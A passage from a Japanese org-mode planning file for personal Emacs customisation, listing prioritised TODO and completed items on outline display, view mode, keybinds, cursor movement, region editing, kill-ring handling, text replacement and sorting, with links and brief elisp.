4) 優先順位の根拠
   有用性は高い。
   やや面倒である可能性が高い。

5) 備考

***** 4.2. Attribute
****** TODO [#C] Outline 特定 file open 時に outline で表示する

1) 結果

2) 背景 (問題点)
   file open 時に見通しをよくする為に outline で表示。

3) 対応方法
   関数を書く必要があるかもしれない

4) 優先順位の根拠
   緊急性はない

5) 備考

****** TODO [#C] Outline で Comment は隠さない

1) 結果

2) 背景 (問題点)
   outline で fold されたとき comment も fold される。
   header などが見えなくなる。
   関数の前に書いた comment なども fold されるので視認性がよくな
   い。

3) 対応方法
   regexp の変更
   http://www.emacswiki.org/emacs/HideOrIgnoreComments

4) 優先順位の根拠
   機能優先、見た目後
   現状でも大きな問題はない

5) 備考

****** TODO [#C] Region した場所を Outline

1) 結果

2) 背景 (問題点)
   region 内を outline 化

3) 対応方法
   http://www.emacswiki.org/emacs/CategoryHideStuff
   http://www.emacswiki.org/emacs/HideShow


4) 優先順位の根拠
   緊急性はない

5) 備考

****** DONE [#A] Protect kill buffer されないようにする
       CLOSED: [2012-12-03 Mon 09:03]

1) 結果
   protect-buffer-from-kill-mode

2) 背景 (問題点)
   誤って buffer が削除されないようにする。

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=protbuf

4) 優先順位の根拠
   有用性はかなりある。
   しかし、導入するのに泥沼にはまる可能性もあり。

5) 備考

****** DONE [#A] ファイルを開く/ 保存/ 読み込み直しを簡単に ― disk
       CLOSED: [2012-12-03 Mon 08:57]

1) 結果
   autorevert
   autorevert-interval

2) 背景 (問題点)
   他のソフトが開いている file を編集したら自動で開きなおす。

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=disk

4) 優先順位の根拠
   Conflict をはやいうちに防ぐことができる。

5) 備考

****** DONE [#C] 内容の無いファイルを削除
       CLOSED: [2012-12-03 Mon 09:43]

1) 結果
   delte-file-if-no-contents

2) 背景 (問題点)

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=delete%20nocontents

4) 優先順位の根拠

5) 備考

****** DONE [#A] 開いている file を root の権限に変更する。
       CLOSED: [2012-12-03 Mon 09:38]

1) 結果
   change-as-root

2) 背景 (問題点)
   わざわざ root の権限で開直す手間が省ける

3) 対応方法
   調査

4) 優先順位の根拠
   有用性が高い

5) 備考

****** View
******* TODO [#A] Space を Ctrl にする

1) 結果

2) 背景 (問題点)
   Space は最も押しやすい key であるが
   view mode では使われない。

3) 対応方法
   bigctrl など導入

4) 優先順位の根拠
   優先的に導入
   可能性が広がる。

5) 備考

******* TODO [#C] 書込み失敗後、 読込専用を解除して失敗時の command を実行。

1) 結果

2) 背景 (問題点)
   view mode で paste など失敗することがある。
   解除と同時に失敗時のコマンドを実行する。
   point も移動してしまうのでもし移動してしまったら移動
   を取り消して実行。

3) 対応方法
   - disable-view-mode した後、 last-comand を実行する。

4) 優先順位の根拠
   緊急性はない。
   あると便利。

5) 備考

******* TODO [#B] Cycle buffer move

1) 結果

2) 背景 (問題点)
   view mode で片手で buffer を移動する。

3) 対応方法
   file buffer のみ移動する。
   移動先が view-mode でなければ view-mode にする。

4) 優先順位の根拠
   片手で file を閲覧できるので有用

5) 備考

******* TODO [#C] 全ての file buffer を view mode にする。

1) 結果

2) 背景 (問題点)
   view-mode にしわすれた file buffer を view mode にする。

3) 対応方法
   関数を作成

4) 優先順位の根拠
   コマンドとしてあると便利。
   緊急性はない。

5) 備考

******* TODO [#A] 書込みミス時に error 音

1) 結果

2) 背景 (問題点)
   目だけではなく耳も使って coding する

3) 対応方法
   http://www.emacswiki.org/emacs/AlarmBell

4) 優先順位の根拠
   他の関数にも応用できるので優先的に導入

5) 備考

***** 4.3. Minibuffer
****** TODO [#B] find-file minibufer のコマンドで分岐

1) 結果

2) 背景 (問題点)
   minibuffer から other-window とをコマンドで分岐させる。

3) 対応方法
   find-file-other-window
   find-file-other-frame
   binary
   root


4) 優先順位の根拠
   find-file のコマンドが統合できるので有益

5) 備考

****** TODO [#C] 不要時にはデフォルト値を表示しない

1) 結果

2) 背景 (問題点)
   他の key を入力すると default 値は必要なくなる。

3) 対応方法

4) 優先順位の根拠
   あると便利。
   緊急性はない。

5) 備考

****** TODO [#C] zsh 風の history を実現

1) 結果

2) 背景 (問題点)
   zsh のような history 補完を実現する。
3) 対応方法
   調査

4) 優先順位の根拠
   利便性が高いが導入の困難さが予想される

5) 備考

***** 4.4. Diff
****** Diff File
****** Diff Buffer
****** Diff Directory
****** Diff Hash
***** tmp
**** 6. Keybind
***** 5.1. Policy
****** TODO keybind 見直し
      １つひとつ関数まで遡って見直し
      previous-line forward-char などを更に高機能にする。
      insert-selfcommand も見直す

      [[file:~/work/emacs23-23.1%2B1/lisp/ChangeLog.10][file:~/work/emacs23-23.1+1/lisp/ChangeLog.10]]
      <2012-09-29 Sat>

***** 5.2. Repeat
****** TODO [#B] Repeat key の見直しと設定

1) 結果

2) 背景 (問題点)
   repeat key を使い易く見直し

3) 対応方法
   http://www.emacswiki.org/emacs/smartrep.el

4) 優先順位の根拠
   使用頻度は高い

5) 備考

***** 5.3. Chord
****** TODO [#B] 特定の mode では chord を使用しない。

1) 結果

2) 背景 (問題点)
   term mode などで chord が発動してしまう。

3) 対応方法
   mode-hook

4) 優先順位の根拠
   緊急性はあるが、泥沼に嵌る可能性あり。

5) 備考

***** 5.4. Hold
****** TODO [#C] key 長押し

1) 結果

2) 背景 (問題点)
   key 長押しでコマンドを実行できるようにする。

3) 対応方法
   調査

4) 優先順位の根拠
   今のところ必要性はあまりないがあると便利。
   導入は難しいかもしれない。

5) 備考

***** 5.5. Mouse
****** TODO [#B] プレゼン用のコマンドをマウスの右クリックで表示させる。

1) 結果

2) 背景 (問題点)
   普段使わないプレゼン用のコマンドをマウスの右クリックの登
   録しておく。

3) 対応方法
   拡大／縮小
   色の変更

4) 優先順位の根拠
   差し迫っての必要性はないがいずれ必要になる。

5) 備考

****** Avoidance
***** 5.6. Maintenance
****** TODO [#C] 使っていない keybind を表示

1) 結果

2) 背景 (問題点)
   使っていない keybind を調査する。

3) 対応方法
   (describe-unbound-keys 5)

4) 優先順位の根拠
   あると便利。緊急性はない。

5) 備考

****** TODO [#C] keylogger

1) 結果

2) 背景 (問題点)
   入力 key を記録し統計をとる。効率的な keybind を実現する為。

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=save%20keyinput

4) 優先順位の根拠
   緊急性はないが、効果は期待できる。

5) 備考

***** 5.7. Space as ctrl
****** TODO [#A] Space を Space と Ctrl と共存させる。

1) 結果

2) 背景 (問題点)
   一番押しやすい space を ctrl としても使えるようにする。

3) 対応方法
   http://www.emacswiki.org/emacs/MovingTheCtrlKey
   https://gitorious.org/at-home-modifier/pages/Home
   https://github.com/benhansenslc/BigCtrl


4) 優先順位の根拠
   優先的に導入
   可能性が広がる。


5) 備考

**** 7. Cursor Move
***** TODO [#B] linum-mode 色付

1) 結果

2) 背景 (問題点)
   linum-mode に 4 行ずつに色を付け C-u C-k で移動する。
   C-u を押すとカーソル位置から基準に上下の色を消してい
   く。論理行も考慮する必要あり。

3) 対応方法
   linum の source を読む

4) 優先順位の根拠
   非常に面白そうな機能。

5) 備考

***** TODO [#C] 色で移動

1) 結果

2) 背景 (問題点)
   色ごとに移動するとドキュメント編集などが楽になるかも

3) 対応方法
   color property を取得

4) 優先順位の根拠
   効果は未知数。動作はすこし遅くなる可能性あり

5) 備考

***** 6.1. check point
****** TODO [#B] cursorl 位置保存

1) 結果

2) 背景 (問題点)
   ある場所を記録しそこを行ったり来りする

3) 対応方法
   register
   http://d.hatena.ne.jp/supermassiveblackhole/20100628/1277702510
   undo point
   fringe に表示
   overlay
   bm.el

4) 優先順位の根拠
   有用性はかなり期待できる

5) 備考

****** TODO [#C] 迷子対策

1) 結果

2) 背景 (問題点)
   view-mode などで誤って移動コマンドを実行すると
   元居た場所を見失ってしまう。

3) 対応方法
   undo redo point
   もっとざっくりと移動したい
   line ごとで移動
   若しくは、可視化したい
   undo redo point の間、 overlay する。
   最後の region に移動

4) 優先順位の根拠
   有用性はかなりあり

5) 備考

****** TODO [#B] 最後に編集した位置へ移動

1) 結果

2) 背景 (問題点)
   最後に編集した位置へ移動

3) 対応方法
   http://d.hatena.ne.jp/supermassiveblackhole/20100628/1277702510

4) 優先順位の根拠
   有用

5) 備考

***** 6.2. keyboard rate
****** DONE [#A] Repeat 速度 を変更
       CLOSED: [2012-12-24 Mon 15:20]

1) 結果

2) 背景 (問題点)
   カーソルを速く動かす為に keyboard の repeat 速度をあげる

3) 対応方法
   http://www.emacswiki.org/emacs/KeyboardRate

4) 優先順位の根拠
   導入が容易でかなりの効果を期待できる。

5) 備考

***** 6.3. Each char or line move
***** 6.4. Each word
***** 6.5. Each symbol
***** 6.6. Sequential Move
****** POSTPONES [#B] Sequential move

1) 結果

2) 背景 (問題点)


3) 対応方法
連続した移動

- Sequential Backward
  line の indent 先頭に移動。
  indent の先頭なら line の先頭に移動。
  line の先頭で Column が記録されていれば Column を Clear 。
  line の先頭で Column が記録されていなければ window の先頭に移動。
  window の先頭なら buffer の先頭に移動。
  buffer の先頭なら元の位置へ移動。
  univarsal-argument 4 で元の位置へ移動。
                     8 で line の先頭へ移動
                     12 で window の先頭へ移動。
                     16 で buffer の先頭へ移動。

- Sequential Forward
  sufix coment があればコメントを無視した line の末尾に移動。
  現在のポイントがコメントを無視した末尾なら window の末尾に移動。
  window の末尾なら buffer の末尾に移動。
  buffer の末尾なら元の位置へ移動。
  univarsal-argument 4 で元の位置へ移動。
                     8 で line の末尾へ移動
                     12 で window の末尾へ移動。
                     16 で buffer の末尾へ移動。

4) 優先順位の根拠

5) 備考

***** 6.7. move bind now
**** 8. Editing
***** 7.1. [2/11] 範囲 (region, narrowing)
******* DONE [#B] region の復元
        CLOSED: [2012-12-06 Thu 04:29]

1) 結果
   remark
   改善の余地あり

2) 背景 (問題点)
   前回設定した region を復元した場合がある

3) 対応方法
   調査

4) 優先順位の根拠
   有用性はかなりあり

5) 備考

******* DONE [#A] region したまま buffer の最後 で next-line しても region を解除させない
        CLOSED: [2012-12-06 Thu 09:50]

1) 結果
   (setq next-line-add-newlines nil)

2) 背景 (問題点)
   region で mark したまま buffer の最後で next-line すると
   region が解除されてしまう

3) 対応方法
   next-line 等の改造

4) 優先順位の根拠
   よく起る。
   再度 region を設定しなおすのが面倒

5) 備考

******* TODO [#B] shift で region を拡大する

1) 結果

2) 背景 (問題点)
   windows のように shift で移動すると region が広げられるよう
   にする。
   かなり、 region 指定がはやくなる。

3) 対応方法
   space as ctrl を設定してから

4) 優先順位の根拠
   有用性はかなり高い。
   space as ctrl してから

5) 備考

******* TODO [#B] expand region

1) 結果

2) 背景 (問題点)
   region command 連打で状況に応じて region を広げる

3) 対応方法
  word の先頭以外なら word を region
  word の先頭なら space x 2 で symbol 全体を region (global-set-key)
  word symbol ""() 内 ""() 外 line defun window buffer
  overlay の利用も検討
Shift + Space = cursol から end-of-line まで region

4) 優先順位の根拠
   有用性あり。

5) 備考

******* TODO [#A] multi region

1) 結果

2) 背景 (問題点)
   region を複数 選択しそれぞれにコマンドを実行する。

3) 対応方法
   http://www.emacswiki.org/emacs/ApplyFunctionOnMultipleRegions

4) 優先順位の根拠
   かなり有用

5) 備考

******* TODO [#C] 数行ずつ region する

1) 結果

2) 背景 (問題点)
   ストライプ状に region してコマンドを実行したい

3) 対応方法
   調査

4) 優先順位の根拠
   multi region が導入されてから。

5) 備考

******* TODO [#C] 重複する行を region する

1) 結果

2) 背景 (問題点)
   重複した行を region してコマンドを実行したい

3) 対応方法
   調査

4) 優先順位の根拠
   multi-region が導入されてから

5) 備考

******* TODO [#B] rectangle のまま forward-word などの移動コマンド

1) 結果

2) 背景 (問題点)
   現状 rectangle のまま forward-word できていないので導入

3) 対応方法
   rectangle cua-base の source を読む

4) 優先順位の根拠
   使えると便利

5) 備考

******* TODO [#B] rectangle expand symbol paragraph 内 defun 内

1) 結果

2) 背景 (問題点)
   rectangle の縦幅を symbol defun paragraph で切替できるよ
   うにする。

3) 対応方法
   rectangle の source を読む。

4) 優先順位の根拠
   有益

5) 備考

******* TODO [#B] <number> line ずつ narrowing する。

1) 結果

2) 背景 (問題点)
   行数づつ narrowing する。

3) 対応方法
   関数を書く

4) 優先順位の根拠
   使う機会は多いと思う

5) 備考

******* TODO [#C] protect region

1) 結果

2) 背景 (問題点)
   指定した範囲を kill copy を block する。

3) 対応方法
   block したところは overlay
   block した word,symbol を含めてコピーした場合、 block した
   範囲を取り除いて kill-ring する。
   また、 font-lock 別でも block できるようにする。

4) 優先順位の根拠
   有用性はある。しかし、導入に困難かもしれない。

5) 備考

***** 7.2. 対象 (word symbol paragraph)
****** TODO [#C] 検索履歴による再検索

1) 結果

2) 背景 (問題点)
   検索に以前検索した履歴を使う

3) 対応方法
   調査

4) 優先順位の根拠
   導入がやや困難かも

5) 備考

****** TODO [#B] 正規表現 template

1) 結果

2) 背景 (問題点)
   正規表現を作成するのに template があると
   簡単に作成できる。

3) 対応方法
anything などで説明付きの正規表現を選んで insert する。
|-------+--------|
| thing | regexp |
|-------+--------|
| ipv4  |        |
| ipv6  |        |
|-------+--------|

   yasnippet を使う

4) 優先順位の根拠
   正規表現の利用頻度が高い

5) 備考

******* Regexp
******* Fuzzing Match
******* Across file
****** TODO [#B] 曖昧検索

1) 結果

2) 背景 (問題点)
   曖昧検索を導入する

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=approx-search

4) 優先順位の根拠
   緊急性はないが、かなりの効果を期待できる

5) 備考

****** TODO [#A] Across file

1) 結果
   clean-dmoccur-buffers

   ・ M-x moccur : ファイルバッファのみを検索 (正規表現)
 ・ C-u M-x moccur : すべてのバッファを検索 (正規表現)
 ・ M-x dmoccur : 指定したディレクトリ下のファイルを検索 (正規表現)
 ・ C-u M-x dmoccur : あらかじめ指定しておいたディレクトリ下のファイルを検索できる (正規表現)
 ・ M-x moccur-grep : grep のようにファイルを検索 (正規表現)
 ・ M-x moccur-grep-find : grep+find のようにファイルを検索 (正規表現)
 ・ M-x search-buffers : すべてのバッファを全文検索．
 ・ M-x grep-buffers : 開いているファイルを対象に grep ．
 ・ バッファリストで M-x Buffer-menu-moccur : m でマークをつけたバッファのみを対象に検索
 ・ dired で M-x dired-do-moccur : m でマークをつけたファイルのみを対象に検索
 ・ moccur の結果で s:一致したバッファのみで再検索
 ・ moccur の結果で u:一つ前の条件で検索

2) 背景 (問題点)
   file にわたって検索する。

3) 対応方法
   moccur
   http://www.emacswiki.org/emacs/CategorySearchAndReplace

4) 優先順位の根拠
   使用頻度、有益性ともに重要

5) 備考

***** 7.3. 操作 (delete copy paste etc)
****** TODO [#C] copy と kill command を統合

1) 結果

2) 背景 (問題点)
   copy コマンドした後にもう一度同じコマンドを実行したら 以前
   の範囲を kill する。

3) 対応方法
   関数を書く

4) 優先順位の根拠
   導入してみないと有益かどうかわからない

5) 備考

****** 7.3.1. [1/6]  Copy
******* DONE [#B] copy したら clipboard と kill-ring に挿入
        CLOSED: [2012-12-24 Mon 09:05]

1) 結果

2) 背景 (問題点)
   clipboard と kill-ring の挙動を操作する。

3) 対応方法
   copy コマンドを編集

4) 優先順位の根拠
   完全に操作できるようになると有益

5) 備考

******* TODO [#C] 選択せずに copy

1) 結果

2) 背景 (問題点)
   選択する手間が省けるので操作がはやくなる。

3) 対応方法
   http://www.emacswiki.org/emacs/CopyWithoutSelection

4) 優先順位の根拠
   緊急性はない。

5) 備考

******* TODO [#B] line を copy する

1) 結果

2) 背景 (問題点)
   line を簡易に copy する

3) 対応方法
   http://www.emacswiki.org/emacs/CopyingWholeLines

4) 優先順位の根拠
   有益

5) 備考

******* TODO [#C] copy した text を編集する

1) 結果

2) 背景 (問題点)
   copy した text を paste する前に編集する

3) 対応方法
   kill-ring を編集

4) 優先順位の根拠
   緊急性はない。

5) 備考

******* TODO [#B] clipboard を監視し文字列によってアクションを起す。

1) 結果

2) 背景 (問題点)
   clipboard を監視してそれに応じて action を起す。
   clipboard の text を自動編集など

3) 対応方法
   copy hook

4) 優先順位の根拠
   状況によっては便利

5) 備考

******* TODO [#B] clipboard にいれられた文字数、行数をみる。

1) 結果

2) 背景 (問題点)
   文字数、行数を見るのにコマンドを覚えなくてもよい

3) 対応方法
   kill-ring

4) 優先順位の根拠
   使い勝手はよいとおもう
   速度に問題があるかもしれない

5) 備考

****** 7.3.2. [4/13] Killing, Deleting
******* DONE [#B] killing の挙動
        CLOSED: [2012-12-24 Mon 08:52]

1) 結果
   kill-region

2) 背景 (問題点)
   kill したら kill-ring に挿入

3) 対応方法
   kill hook

4) 優先順位の根拠
   完全に操作できるようになると有益

5) 備考

******* DONE [#B] deleting の挙動
        CLOSED: [2012-12-24 Mon 08:52]

1) 結果

2) 背景 (問題点)
   clibboard には挿入しない
   kill-ring には挿入

3) 対応方法
   delete command の関数を変数しなおす

4) 優先順位の根拠
   完全に操作できるようになると有益

5) 備考

******* TODO [#B] minibuffer で削除したものは、 clipboard に挿入しない

1) 結果

2) 背景 (問題点)
   minibuffer で default 値が入っていると削除してから paste す
   ることがあるので削除したものが clipboard にあると不便。

3) 対応方法
   minibuffer の local variable 等調べる。

4) 優先順位の根拠
   完全に操作できるようになると有益

5) 備考

******* TODO [#C] 行頭・行末の空白文字を削除

1) 結果

2) 背景 (問題点)
   text 整形

3) 対応方法
   既存の関数を調べる

4) 優先順位の根拠
   緊急性はない

5) 備考

******* TODO [#C] 行単位で間引く

1) 結果

2) 背景 (問題点)
   行単位で削除できるようにする。

3) 対応方法
   region の設定と組合せる

4) 優先順位の根拠
   region の設定が終ってから

5) 備考

******* DONE [#A] kill-ring を crash 対策で disk に保存
        CLOSED: [2012-12-03 Mon 19:36]

1) 結果
   savekill

2) 背景 (問題点)
   kill した後に crash すると auto-save していても
   kill-ring の内容がなくなり、途方にくれてしまう。

3) 対応方法
   kill-ring-save.el

4) 優先順位の根拠
   編集内容を失わない為にも非常に重要

5) 備考

******* DONE [#A] kill-ring の内容をすべて disk に保存
        CLOSED: [2012-12-03 Mon 18:42]

1) 結果
(defvar kill-ring-log-file (concat my-data-dir "kill-ring-log.org"))
(defadvice kill-new (before kill-ring-log activate)
  (write-region (concat "\n* " (format-time-string "%c") "\n"
                        string)
                nil kill-ring-log-file t 'silent))


2) 背景 (問題点)
   kill-ring の履歴をとることで履歴を辿れる

3) 対応方法
   [[#Emacs.log][kill-ring.log]]

4) 優先順位の根拠
   編集内容を失わない為にも非常に重要

5) 備考

******* TODO [#B] 保存された kill-ring から文字列を検索

1) 結果

2) 背景 (問題点)
   保存した kill-ring から簡単に検索ができるようにする
   code の再利用に最適

3) 対応方法
   grep moccor 等を使う

4) 優先順位の根拠
   kill-ring の保存をまず先に導入

5) 備考

******* TODO [#C] kill した text の位置、 buffer を記録。

1) 結果

2) 背景 (問題点)
   kill した text の file 名、 位置を kill-ring に記録

3) 対応方法
   text Properties

4) 優先順位の根拠
   導入が困難かもしれない

5) 備考

******* TODO [#B] whitespace 調整コマンド の統合

1) 結果

2) 背景 (問題点)
   + fix-whitespace just-one-space
    コマンド統合。もし whitespace が 2 つあれば 1 つにし、
    1 つであれば word を join する。

3) 対応方法
   http://www.emacswiki.org/emacs/DeletingWhitespace


4) 優先順位の根拠
   導入が簡単かつ有益

5) 備考

******* TODO [#C] toggle delete command

1) 結果

2) 背景 (問題点)
   delete command を command で toggle
   key を有効活用する

3) 対応方法
   関数を書く
   変数などで切替

4) 優先順位の根拠
   利便性は導入してみないとわからない

5) 備考

******* TODO [#C] delete forward の機能を考える

1) 結果

2) 背景 (問題点)
   delete は基本 backward 方面を削除する
   逆方面の削除のコマンドを考える

3) 対応方法
   C-u command = shift backspace
   and lastcommand memq delete command backspace repeat shift backspace

4) 優先順位の根拠
   時間がかかるかも

5) 備考

******* TODO [#C] delete prefix

1) 結果

2) 背景 (問題点)
   delete prefix key を押した後の移動コマンドで削除

3) 対応方法


4) 優先順位の根拠

5) 備考

****** 7.3.3. [2/6]  Paste, Yanking
******* DONE [#B] paste はすべて clipboard から行う
        CLOSED: [2012-12-24 Mon 08:09]

1) 結果
   x-clipboard-yank

2) 背景 (問題点)
   clipboard を軸に copy paste を行う

3) 対応方法
   paste の関数を編集

4) 優先順位の根拠
   完全に操作できるようになると有益

5) 備考

******* DONE [#B] paste したら indent を自動で行う
        CLOSED: [2012-12-24 Mon 08:10]

1) 結果
   defadvice

2) 背景 (問題点)
   paste すると indent を調整しなくてはいけない場合があるので
   paste 時に indent する

3) 対応方法
   関数を書く

4) 優先順位の根拠
   手間が省けるので有益

5) 備考

******* TODO [#C] overwrite paste

1) 結果

2) 背景 (問題点)
   line 等 overwrite する

3) 対応方法
   一時的に overwrite mode にする。

4) 優先順位の根拠
   緊急性はない

5) 備考

******* TODO [#C] 貼り付け位置を先に指定 ― fcopy

1) 結果

2) 背景 (問題点)
   貼り付け先を先に指定して copy & paste
   copy text の後に new line を挿入する等のオプションをつける

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=fcopy

4) 優先順位の根拠
   緊急性はないが利便性はある。

5) 備考

******* TODO [#B] Moccur で line, defun, paragraph を duplicate する。

1) 結果

2) 背景 (問題点)
   duplicate をもっと使いやすくする

3) 対応方法
   調査

4) 優先順位の根拠
   使用頻度は多いと思う

5) 備考

******* TODO [#B] duplicate-line を yasnippet で使える用にする

1) 結果

2) 背景 (問題点)
   duplicate-line で一部のみ編集したい

3) 対応方法
   yasnippet
   overlay

4) 優先順位の根拠
   使える様になるとかなり有益

5) 備考

****** 7.3.4. [3/10] Replace
******* DONE [#A] rotate text yes <=> no
        CLOSED: [2012-12-03 Mon 20:04]

1) 結果
   rotate-word-at-point

2) 背景 (問題点)
   |------+-----+-------|
   | Ture | <=> | False |
   | Yes  | <=> | No    |
   | t    | <=> | nil   |
   |------+-----+-------|
   これらの文字列を入れ替える

3) 対応方法
   http://www.emacswiki.org/emacs/RotateText

4) 優先順位の根拠
   書き換えミスを防ぐことが出来るので非常に有用

5) 備考

******* TODO [#C] Spell Check

1) 結果

2) 背景 (問題点)
   英語の spell を check し書き換える
3) 対応方法
   http://www.emacswiki.org/emacs/CategorySpelling

4) 優先順位の根拠
   緊急性はない

5) 備考

******* TODO [#B] 誤った文字列の置き換え

1) 結果

2) 背景 (問題点)
   よく間違う文字を事前に定義し command で置き換える

3) 対応方法
   replace

4) 優先順位の根拠
   有用性あり

5) 備考

******* TODO [#C] Grammar checking

1) 結果

2) 背景 (問題点)

3) 対応方法
   調査
   http://www.emacswiki.org/emacs/BaoqiuCui

4) 優先順位の根拠

5) 備考

******* TODO [#B] 大文字 <=> 小文字

1) 結果

2) 背景 (問題点)
   大文字と小文字を toggle

3) 対応方法
   http://www.emacswiki.org/emacs/RotateWordCapitalization
- 小文字 => 大文字

  + 文字の先頭を大文字にする。

    * 1Word の先頭を変換
    * region があれば region 内を変換
    * prefix 付き [保留]
    * eq last-command であれば小文字にする。

  + symbol 全体を大文字にする。

    * cursor 位置どこでも symbol 全体を大文字にする。
    * region があれば region 内を全て大文字にする。
    * prefix 付き [保留]
    * eq last-command であれば小文字にする。

- 大文字 => 小文字

  + 文字の先頭を小文字にする。

    * 1word の先頭を変換
    * region があれば region 内を変換
    * prefix 付き [保留]
    * eq last-command であれば大文字にする。

  + symbol 全体を小文字にする。

    * cursor 位置どこでも symbol 全体を小文字にする。
    * region があれば region 内を全て小文字にする。
    * prefix 付き [保留]
    * eq last-command であれば大文字にする。

- downcase-word, upcase-word, capitalize-word,
  downcase-region, upcase-region

4) 優先順位の根拠
   まれに使う

5) 備考

******* TODO [#B] 大文字 <=> 小文字 Cursor 下を toggle

1) 結果

2) 背景 (問題点)
   cursor 下のみ toggle

3) 対応方法
   http://steve-yegge.blogspot.com/2006/06/shiny-and-new-emacs-22.html

4) 優先順位の根拠
   稀に使う

5) 備考

******* TODO [#B] 全角 <=> 半角

1) 結果

2) 背景 (問題点)
   text 整形時に利用
   Cursor 下を toggle

3) 対応方法
   - 全角 => 半角

  + Cursor 位置どこでも symbol 全体を半角にする。
  + region があれば region 内を全て半角にする。
  + prefix 付き [保留]
  + eq last-command であれば全角にする。

- 半角 => 全角

  + Cursor 位置どこでも symbol 全体を全角にする。
  + region があれば region 内を全て全角にする。
  + prefix 付き [保留]
  + eq last-command であれば半角にする。


4) 優先順位の根拠
   稀に使う

5) 備考

******* TODO [#A] 改行コード変更

1) 結果

2) 背景 (問題点)
   windows や Mac で改行コードが違うので整形

3) 対応方法
   http://unicus.jp/skmk/archives/315
   http://rakkyoo.net/?p=804

4) 優先順位の根拠
   利用する頻度は高い

5) 備考

******* DONE [#A] tab <=> space
        CLOSED: [2012-12-03 Mon 20:25]

1) 結果
   tabify
   untabify

   alias
   space-to-tab
   tab-to-space

2) 背景 (問題点)
   tab と space に toggle 。

3) 対応方法
   http://www.bookshelf.jp/cgi-bin/goto.cgi?file=meadow&node=tabify

4) 優先順位の根拠
   利用頻度は高い

5) 備考

******* DONE [#A] Header 更新
        CLOSED: [2012-12-05 Wed 18:04]

1) 結果
   header2

2) 背景 (問題点)
   書込み時に header を更新

3) 対応方法
   regexp
   replace

4) 優先順位の根拠
   あるとかなり便利

5) 備考

****** 7.3.5. [6/9]  Fixing
******* DONE [#C] char transpose
        CLOSED: [2012-12-24 Mon 09:51]

1) 結果

2) 背景 (問題点)
   char を入替

3) 対応方法

4) 優先順位の根拠
   頻度は低め

5) 備考

******* DONE [#B] word transpose
        CLOSED: [2012-12-24 Mon 09:51]

1) 結果

2) 背景 (問題点)
   word を入替

3) 対応方法


4) 優先順位の根拠
   使用頻度は稀にある

5) 備考
******* DONE [#B] symbol transpose
        CLOSED: [2012-12-24 Mon 09:52]

1) 結果

2) 背景 (問題点)
   symbol を入替

3) 対応方法

4) 優先順位の根拠
   使用頻度は稀にある

5) 備考
******* DONE [#A] line transpose
        CLOSED: [2012-12-24 Mon 09:50]

1) 結果
   move-text-up

2) 背景 (問題点)
   line を入替

3) 対応方法


4) 優先順位の根拠
   使用頻度は多い

5) 備考

******* DONE [#C] reverse-words
        CLOSED: [2012-12-24 Mon 10:48]

1) 結果
   reverse-chars-in-region
   reverse-line-region
   reverse-word

2) 背景 (問題点)
   region 内の word 文字列を逆順にする。

3) 対応方法
   http://www.emacswiki.org/emacs/ReverseWords

4) 優先順位の根拠
   使用頻度まかなり稀

5) 備考

******* TODO [#B] イコール記号「=」の左辺と右辺を一括して入れ替える

1) 結果

2) 背景 (問題点)
   イコール記号「=」の左辺と右辺を一括して入れ替える

3) 対応方法


4) 優先順位の根拠
   プログラミング時に使う

5) 備考

******* TODO [#B] region を起点にして入替

1) 結果

2) 背景 (問題点)
   + "foundSpace == True"
    "True == foundSpace"
    "==" に region を設定した場合


3) 対応方法


4) 優先順位の根拠
   対応はすこしやっかいかも

5) 備考

******* DONE [#C] multi-region を使って 2 つの region を入替
        CLOSED: [2012-12-24 Mon 11:14]

1) 結果

2) 背景 (問題点)
   multi-region を使って 2 つの region を入替

3) 対応方法


4) 優先順位の根拠
   multi-region の導入が先

5) 備考

******* TODO [#C] rectangle transpose

1) 結果

2) 背景 (問題点)
   rectangle 内を transepose

3) 対応方法

4) 優先順位の根拠
   導入はかなり困難が予想される

5) 備考

****** 7.3.6. [1/2]  Parentheses
******* DONE [#B] 閉じ括弧の入力で indent
        CLOSED: [2012-12-03 Mon 20:39]

1) 結果
   right-parentheses-indent

2) 背景 (問題点)
   閉じ括弧の入力後に indent することが多いので

3) 対応方法
   self-insert

4) 優先順位の根拠
   容易かつ有用

5) 備考

******* TODO [#B] 自動で対応した括弧を挿入

1) 結果

2) 背景 (問題点)
   気のきいた括弧挿入を行いたい

3) 対応方法
   autopair
   http://www.emacswiki.org/emacs/NavigatingParentheses

4) 優先順位の根拠
   かなり重要。
   作業効率に関る

5) 備考

****** 7.3.7. [2/3]  Numbering
******* DONE [#B] Renumber 連番挿入
        CLOSED: [2012-12-26 Wed 06:00]

1) 結果
   renumber functions
   cua-mode

2) 背景 (問題点)
   連番挿入 を簡単にする

3) 対応方法
   http://www.emacswiki.org/emacs/RenumberList

4) 優先順位の根拠
   使用頻度
   利用頻度共に多い

5) 備考

******* DONE [#B] Increment Number
        CLOSED: [2012-12-26 Wed 06:06]


1) 結果

2) 背景 (問題点)
   region 内の数字を incremental
   interactive に増やす数値を決める
   region がなければ buffer 内の数字全てを incremental

3) 対応方法
   http://www.emacswiki.org/emacs/IncrementNumber

4) 優先順位の根拠
   頻度は多い

5) 備考

******* TODO [#C] Visible Number

1) 結果

2) 背景 (問題点)
   並んでいる数値の視認性が惡い

3) 対応方法
   buffer 内の数値をすべて数字４桁づつにコンマを挿入 "1,000"

4) 優先順位の根拠
   緊急性はない

5) 備考

****** 7.3.8. [1/3]  Sort
******* POSTPONES [#B] region 内を sort

1) 結果
   - alphabet  sort-lines
   - number    sort-numeric-fields
   - random    sort-random
   - 長さ順

2) 背景 (問題点)
   region 内の文字列を sort

3) 対応方法
   - alphabet
   - number
   - 五十音順
   - 長さ順
   - reverse

4) 優先順位の根拠
   統計などの文字列を操作したい場合が多々ある

5) 備考

******* POSTPONES [#B] list 内を Sort

1) 結果
   sort-words
   sort-symbols

2) 背景 (問題点)
   list 内を sort し視認性をあげる

3) 対応方法
   - alphabet
   - number
   - 長さ順

4) 優先順位の根拠

5) 備考

******* DONE [#B] rectangle 内を基準に line を Sort
        CLOSED: [2012-12-24 Mon 12:29]

1) 結果
   sort-colums

2) 背景 (問題点)
   region 内の文字列を sort

3) 対応方法
   - alphabet
   - number
   - 五十音順
   - 長さ順
